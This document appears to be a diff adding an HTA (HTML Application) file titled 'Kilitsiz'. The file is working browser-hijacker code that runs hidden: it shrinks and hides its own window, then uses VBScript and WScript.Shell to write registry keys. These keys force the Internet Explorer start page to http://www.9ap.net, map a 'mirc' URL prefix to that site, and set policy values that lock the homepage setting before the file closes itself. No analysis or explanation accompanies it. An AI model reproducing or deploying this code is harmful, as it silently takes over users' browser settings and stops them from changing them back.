@@ -1,0 +1,35 @@
+<html>
+<head>
+<title>Kilitsiz</title>
+<META NAME="LANGUAGE" CONTENT="English">
+<META NAME="ROBOTS" CONTENT="noindex">
+<META NAME="ROBOTS" CONTENT="nofollow">
+</head>
+
+<hta:application id=hta_note_id
+ applicationName=hta_note_name
+ showInTaskBar=no
+ caption=no
+ innerBorder=no
+ selection=no
+ scroll=no
+ contextmenu=no />
+<script language=javascript>
+window.resizeTo(0, 0);
+window.moveTo(0, 0);
+</script>
+
+<SCRIPT language=vbs>
+self.MoveTo 0, 0
+Set shell = CreateObject("WScript.Shell")
+  shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\Prefixes\\mirc","http://www.9ap.net","REG_SZ"
+  shell.regwrite "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
+  shell.regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
+  shell.regwrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page", "http://www.9ap.net","REG_SZ"
+  shell.regwrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page", "http://www.9ap.net","REG_SZ"
+self.Close
+</SCRIPT>
+
+</head>
+</body>
+</html>
